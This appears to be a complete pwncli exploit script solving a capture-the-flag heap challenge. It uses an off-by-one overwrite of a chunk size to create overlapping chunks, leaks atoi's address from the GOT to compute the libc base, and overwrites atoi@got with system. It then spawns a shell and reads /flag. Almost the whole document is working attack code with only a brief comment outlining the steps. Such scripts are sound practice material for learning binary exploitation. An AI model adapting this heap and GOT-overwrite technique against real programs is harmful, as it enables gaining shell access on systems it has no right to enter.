#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def create(size:int, data="a\n"):
    p.sendlineafter("Your choice :", "1")
    p.sendlineafter("how big is the nest ?", str(size))
    p.sendafter("what stuff you wanna put in the nest?", data)

def decorate(idx:int, data):
    p.sendlineafter("Your choice :", "2")
    p.sendlineafter("Index :", str(idx))
    p.sendafter("what stuff you wanna put in the nest?", data)

def show(idx:int):
    p.sendlineafter("Your choice :", "3")
    p.sendlineafter("Index :", str(idx))
    msg = p.recvlines(2)
    info(f"Get msg: {msg}")
    return msg


def delete(idx:int):
    p.sendlineafter("Your choice :", "4")
    p.sendlineafter("Index :", str(idx))


"""
1. change size
2. change ptr to leak atoi's addr
3. change atoi@got to system
4. input sh to get shell
"""

create(0x18)
create(0x18)

decorate(0, "a"*0x18+"\x41")
delete(1)

create(0x38, flat({0x18:[0x21,0x30, 0x602060]}))
_, leak_addr = show(1)
libc_base_addr = u64_ex(leak_addr[-6:]) - libc.sym['atoi']
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

decorate(1, p64(libc.sym['system']))

p.sendline("sh\x00")

p.sendline("cat /flag;exit")
m = p.recvline_contains("flag", timeout=5)

log2_ex_highlight(f"{m}")

p.interactive()